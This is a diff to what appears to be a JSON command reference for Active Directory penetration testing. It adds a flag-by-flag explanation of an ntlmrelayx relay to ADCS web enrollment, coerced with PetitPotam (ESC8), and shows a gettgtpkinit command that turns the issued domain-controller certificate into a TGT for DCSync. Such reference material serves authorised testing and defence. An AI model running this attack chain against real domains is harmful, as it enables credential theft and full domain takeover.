@@ -106,5 +106,6 @@
       "label": "Use the captured DC cert for a TGT (PKINIT)",
       "command": "python3 gettgtpkinit.py -pfx-base64 <b64> <domain>/<dc_name>\\$ dc.ccache"
     }
-  ]
+  ],
+  "explain": "Relays a coerced DC authentication to ADCS web enrollment to obtain a DC certificate (PetitPotam + ESC8):\n  ntlmrelayx.py            relay captured NTLM auth\n  -smb2support             accept SMB2\n  --target http://<ca_host>/certsrv/certfnsh.asp   the HTTP enrollment endpoint (no HTTPS = relayable)\n  --adcs                   request a certificate on relay\n  --template DomainController   the template to request as the DC\n  -debug                   verbose output\nTrigger PetitPotam.py to coerce the DC's machine account in; the issued cert then feeds gettgtpkinit for a DC TGT and DCSync."
 }
